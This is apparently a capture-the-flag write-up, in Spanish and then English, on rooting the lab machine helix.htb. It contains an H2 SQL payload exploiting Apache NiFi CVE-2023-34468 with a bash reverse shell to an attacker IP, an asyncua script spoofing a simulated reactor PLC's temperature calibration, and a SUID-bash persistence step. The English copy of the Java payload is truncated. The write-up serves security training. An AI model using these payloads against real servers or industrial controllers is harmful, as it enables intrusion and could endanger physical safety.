Resumen de Explotación

Resumen del proceso: La máquina objetivo exponía un servidor web nginx en el puerto 80 que redirigía al dominio helix.htb. Mediante fuzzing de virtual hosts, se descubrió el subdominio flow.helix.htb, donde se ejecutaba Apache NiFi 1.21.0, una herramienta de automatización de flujos de datos. Esta versión es vulnerable a CVE-2023-34468, que permite ejecución remota de código a través de un procesador SQL configurado con el driver H2, cargando un script SQL malicioso con código Java embebido que envía una reverse shell.

Tras obtener acceso como el usuario nifi, se encontró una clave SSH de respaldo del usuario operator en los directorios de NiFi. Con acceso como operator, se descubrió un PDF protegido con contraseña que contenía documentación sobre una ventana de mantenimiento privilegiada. Crackeando la contraseña del PDF con john, se obtuvo la información necesaria para activar dicha ventana.

La escalada final a root requirió manipular un servidor OPC UA que controlaba un PLC simulado de un reactor nuclear. Usando la librería asyncua de Python, se modificaron las variables del PLC para activar la ventana de mantenimiento, lo que permitió ejecutar un script bash con privilegios de root mediante sudo. Se aprovechó esta shell temporal para asignar el bit SUID a /bin/bash y conseguir acceso root permanente.

Tecnologías/Exploits: Apache NiFi RCE (CVE-2023-34468), driver H2 con SQL injection para RCE, OPC UA (protocolo industrial), manipulación de PLC para escalada de privilegios, cracking de PDF con john.

Investigación de Vulnerabilidades - CVE-2023-34468

Buscando por la versión específica de NiFi, descubro que existe una vulnerabilidad de RCE (Remote Code Execution) catalogada como CVE-2023-34468. Encuentro unas instrucciones detalladas en PDF explicando el exploit paso a paso: https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf

La vulnerabilidad reside en la capacidad de NiFi para ejecutar procesadores SQL con drivers JDBC personalizados. Utilizando el driver H2, es posible ejecutar código Java arbitrario a través de sentencias SQL especialmente diseñadas.

Acceso Inicial - Explotando CVE-2023-34468

Sigo los pasos indicados en el PDF y configuro un nodo de procesamiento SQL con un driver H2 específico para conseguir RCE. El setup final consiste en un procesador SQL que, al ejecutarse, realiza una petición HTTP a mi máquina para obtener un script SQL malicioso:

El script SQL que sirvo desde mi máquina contiene código Java embebido que utiliza la funcionalidad CREATE ALIAS de H2 para ejecutar comandos del sistema:

CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(command).getInputStream()
    ).useDelimiter("\\\\A");
    return s.hasNext() ? s.next() : "";
}
$$;

CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.142/443 0>&1');

Este script crea una función SQL personalizada llamada SHELLEXEC que ejecuta comandos del sistema operativo mediante Runtime.getRuntime().exec(). Al invocarla con CALL, se ejecuta una reverse shell bash que conecta de vuelta a mi máquina atacante.

Con esto consigo enviar una reverse shell y ganar acceso como el usuario nifi, que es un usuario de servicio similar a www-data, utilizado para ejecutar el proceso de Apache NiFi.

Análisis del script helix-maint-console

Al ser un script bash, puedo leer su contenido y entender su funcionamiento:

#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
    [ -f "$FLAG" ] || return 1
    local until_ts now
    until_ts="$(read_until)"
    now="$(date +%s)"
    [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
    [ "$now" -lt "$until_ts" ] || return 1
    return 0
}

if ! window_ok; then
    echo "Maintenance window CLOSED."
    exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

SCOPE="helix-maint-$$"

systemd-run --quiet --scope --unit="$SCOPE" \
    --property=KillMode=control-group \
    --property=SendSIGHUP=yes \
    /bin/bash -p -i

exit 0

El script verifica si existe el fichero /opt/helix/state/maintenance_window y si contiene un timestamp futuro. Si la ventana está activa, lanza una shell interactiva con privilegios de root mediante systemd-run. La shell es temporal y se cerrará automáticamente cuando expire la ventana.

La web en el puerto 8081 confirma esta información y muestra el estado actual de la ventana de mantenimiento:

"Privileged Maintenance Window — Status: CLOSED
No maintenance window file present.
This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip."

Plan de ataque

Si consigo que la ventana de mantenimiento se active y se cree el archivo /opt/helix/state/maintenance_window, podré obtener acceso temporal como root con el comando sudo /usr/local/sbin/helix-maint-console. Entonces solo necesitaré asignar el bit SUID a /bin/bash para hacer que este acceso sea permanente.

Recordando la información del servidor OPC UA, las variables del reactor muestran que la temperatura actual es de ~284°C y necesito que llegue a ~295°C. La variable CalibrationOffset es de lectura/escritura y me permite ajustar el valor de temperatura sin cambiar la lectura real del sensor.

Manipulación del PLC vía OPC UA

Para conseguir que se active la ventana de mantenimiento, utilizo un script Python con la librería asyncua para interactuar con el PLC. El script activa el modo de mantenimiento, habilita TestOverride para permitir los cambios, y aumenta la temperatura mediante la variable CalibrationOffset:

import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def write(client, node_id, value, label):
    node = client.get_node(node_id)
    dv = await node.read_data_value()
    vtype = dv.Value.VariantType
    await node.write_value(ua.DataValue(ua.Variant(value, vtype)))
    print(f"  [+] {label} = {value!r}")

async def main():
    async with Client(url=URL) as client:
        await write(client, "ns=2;i=12", "MAINTENANCE", "Mode")
        await write(client, "ns=2;i=13", True,          "TestOverride")
        await write(client, "ns=2;i=6",  14.1,          "CalibrationOffset")

asyncio.run(main())

El script modifica tres variables clave: cambia el Mode a MAINTENANCE, habilita TestOverride para permitir cambios en las condiciones de operación, y establece un CalibrationOffset de 14.1 que sumado a la temperatura base de ~284°C supera el umbral de 295°C requerido para activar la ventana.

Exploitation Summary

Exploitation process: The target machine exposed an nginx web server on port 80 that redirected to the domain helix.htb. Through virtual host fuzzing, the subdomain flow.helix.htb was discovered, running Apache NiFi 1.21.0, a data flow automation tool. This version is vulnerable to CVE-2023-34468, which allows remote code execution through a SQL processor configured with the H2 driver, loading a malicious SQL script with embedded Java code that sends a reverse shell.

After gaining access as the nifi user, a backup SSH key belonging to the operator user was found in the NiFi directories. With access as operator, a password-protected PDF was discovered containing documentation about a privileged maintenance window. By cracking the PDF password with john, the necessary information to activate said window was obtained.

The final escalation to root required manipulating an OPC UA server controlling a simulated nuclear reactor PLC. Using Python's asyncua library, PLC variables were modified to activate the maintenance window, which allowed executing a bash script with root privileges via sudo. This temporary shell was leveraged to set the SUID bit on /bin/bash and achieve permanent root access.

Technologies/Exploits: Apache NiFi RCE (CVE-2023-34468), H2 driver SQL injection for RCE, OPC UA (industrial protocol), PLC manipulation for privilege escalation, PDF cracking with john.

Vulnerability Research - CVE-2023-34468

Searching for the specific NiFi version, I discover an RCE (Remote Code Execution) vulnerability catalogued as CVE-2023-34468. I find detailed step-by-step instructions in a PDF explaining the exploit: https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf

Initial Access - Exploiting CVE-2023-34468

I follow the steps outlined in the PDF and configure a SQL processing node with a specific H2 driver to achieve RCE. The final setup consists of a SQL processor that, when executed, makes an HTTP request to my machine to fetch a malicious SQL script:

The SQL script served from my machine contains embedded Java code that uses H2's CREATE ALIAS functionality to execute system commands:

CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(command).getInputStream()
    ).useDelimiter("\\\\A");

CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.142/443 0>&1');

This script creates a custom SQL function called SHELLEXEC that executes operating system commands via Runtime.getRuntime().exec(). When invoked with CALL, it executes a bash reverse shell connecting back to my attacking machine.

With this I successfully send a reverse shell and gain access as the nifi user, which is a service account similar to www-data, used to run the Apache NiFi process.

helix-maint-console Script Analysis

Since it's a bash script, I can read its contents and understand how it works:

#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
    [ -f "$FLAG" ] || return 1
    local until_ts now
    until_ts="$(read_until)"
    now="$(date +%s)"
    [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
    [ "$now" -lt "$until_ts" ] || return 1
    return 0
}

if ! window_ok; then
    echo "Maintenance window CLOSED."
    exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

SCOPE="helix-maint-$$"

systemd-run --quiet --scope --unit="$SCOPE" \
    --property=KillMode=control-group \
    --property=SendSIGHUP=yes \
    /bin/bash -p -i

exit 0

The script checks if the file /opt/helix/state/maintenance_window exists and if it contains a future timestamp. If the window is active, it launches an interactive shell with root privileges via systemd-run. The shell is temporary and will be automatically terminated when the window expires.

The web interface on port 8081 confirms this information and shows the current maintenance window status:

"Privileged Maintenance Window — Status: CLOSED
No maintenance window file present.
This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip."

Attack Plan

If I can get the maintenance window to activate and create the file /opt/helix/state/maintenance_window, I'll be able to gain temporary root access with the sudo /usr/local/sbin/helix-maint-console command. Then I'll only need to set the SUID bit on /bin/bash to make this access permanent.

Recalling the OPC UA server information, the reactor variables show that the current temperature is ~284°C and I need it to reach ~295°C. The CalibrationOffset variable is read-write and allows me to adjust the temperature value without changing the actual sensor reading.

PLC Manipulation via OPC UA

To activate the maintenance window, I use a Python script with the asyncua library to interact with the PLC. The script activates maintenance mode, enables TestOverride to allow the changes, and increases the temperature via the CalibrationOffset variable with an arbitrary value:

import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def write(client, node_id, value, label):
    node = client.get_node(node_id)
    dv = await node.read_data_value()
    vtype = dv.Value.VariantType
    await node.write_value(ua.DataValue(ua.Variant(value, vtype)))
    print(f"  [+] {label} = {value!r}")

async def main():
    async with Client(url=URL) as client:
        await write(client, "ns=2;i=12", "MAINTENANCE", "Mode")
        await write(client, "ns=2;i=13", True,          "TestOverride")
        await write(client, "ns=2;i=6",  14.1,          "CalibrationOffset")

asyncio.run(main())

The script modifies three key variables: it changes Mode to MAINTENANCE, enables TestOverride to allow changes to operating conditions, and sets a CalibrationOffset of 14.1 which, added to the base temperature of ~284°C, exceeds the 295°C threshold required to activate the window.

Getting root access

Now that the maintenance file has been created and the window is active, I can obtain temporary root access through the helix-maint-console script. I leverage this window to set the SUID bit on /bin/bash and make the access permanent:

operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 116 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# chmod u+s /bin/bash
root@helix:/home/operator# exit
exit
operator@helix:~$ bash -p
bash-5.1# whoami
root

With the SUID bit set on /bin/bash, I can get a root shell at any time by running bash -p, achieving full privileges over the system and obtaining the root flag.
